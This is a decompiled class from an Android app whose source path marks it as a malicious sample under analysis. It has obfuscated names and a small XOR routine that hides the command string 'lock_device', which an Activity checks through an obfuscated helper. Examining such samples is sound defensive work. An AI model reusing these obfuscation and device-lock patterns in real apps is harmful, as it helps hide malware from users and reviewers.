package com.zjxyxnvvp.nxvxchltf.util;

import android.app.Activity;
import android.os.Bundle;
import android.os.PersistableBundle;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class nidwoanAIOWDbwaiuBa extends Activity {
    private static short[] $ = {26271, 26268, 26256, 26264, 26284, 26263, 26262, 26245, 26266, 26256, 26262};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle, PersistableBundle persistableBundle) {
        super.onCreate(bundle, persistableBundle);
        if (UIDNwaidobaWIODb.e == null) {
            finish();
        } else if (!d.e.f314a.g(UIDNwaidobaWIODb.e, $(0, 11, 26355))) {
            finish();
        }
    }
}
